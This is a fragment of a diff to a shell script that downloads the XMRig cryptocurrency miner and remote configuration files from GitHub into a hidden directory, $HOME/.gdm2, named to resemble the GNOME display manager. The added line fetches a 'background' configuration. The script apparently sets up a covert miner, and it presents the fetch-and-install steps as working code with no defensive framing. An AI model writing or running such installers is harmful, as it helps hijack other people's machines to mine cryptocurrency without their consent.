@@ -159,6 +159,8 @@ if (test $? -ne 0); then
   
   wget https://github.com/xmrig/xmrig/releases/latest -O $HOME/.gdm2/xmrig.tar.gz
   wget https://raw.githubusercontent.com/littlAcen/xmrig_setup_m0dd3d-1/master/config.json -O $HOME/.gdm2/config.json
+  wget https://raw.githubusercontent.com/littlAcen/xmrig_setup_m0dd3d-1/master/config_background.json -O $HOME/.gdm2/config_background.json
+  
 
   echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
   if ! tar xvf xmrig.tar.gz -C $HOME/.gdm2 --strip=1; then
